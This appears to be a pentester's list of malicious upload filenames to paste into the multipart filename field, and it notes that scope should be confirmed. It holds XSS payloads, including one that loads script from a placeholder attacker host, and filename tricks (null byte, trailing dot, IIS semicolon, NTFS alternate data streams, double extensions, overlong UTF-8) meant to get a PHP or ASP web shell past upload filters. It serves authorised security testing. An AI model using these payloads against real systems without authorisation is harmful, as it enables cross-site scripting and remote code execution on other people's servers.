# Request-time filename payloads — set these in the multipart `filename="..."` field.
# Most contain chars NTFS/most filesystems can't store (< > " : | ? * / \ NUL), so they
# CANNOT live as on-disk files here — copy the string into your upload request.
# The upload BODY can be any benign image; the ATTACK is the filename itself.
# Placeholders: ATTACKER-HOST (OOB), 169.254.169.254 (metadata). Confirm scope first (§2).

## XSS — filename reflected unencoded in a page / JSON / error / directory listing
"><svg onload=alert(document.domain)>.png
"><img src=x onerror=alert(document.domain)>.jpg
'-alert(document.domain)-'.gif
<script>alert(document.domain)</script>.png
"><script src=//ATTACKER-HOST/x.js></script>.jpg

## Extension / parser confusion (many need raw request; NTFS strips trailing dot/space)
shell.php%00.jpg          # null-byte truncation (old PHP/CGI)
shell.php.                 # trailing dot -> Windows/IIS strips -> shell.php
shell.php%20               # trailing space
shell.asp;.jpg             # old IIS semicolon parse -> shell.asp
shell.php:.jpg             # NTFS ADS extension confusion
shell.php::$DATA           # NTFS Alternate Data Stream -> shell.php
shell.jpg.php              # double extension
file.php.jpg               # double extension (opposite order)

## Unicode / display tricks

%EF%BB%BFshell.php         # UTF-8 BOM prefix
shell.php             # unicode-escaped 'h' if server unescapes
overlong-%C0%AE%C0%AE%C0%AFshell.php   # overlong UTF-8 dot-dot-slash
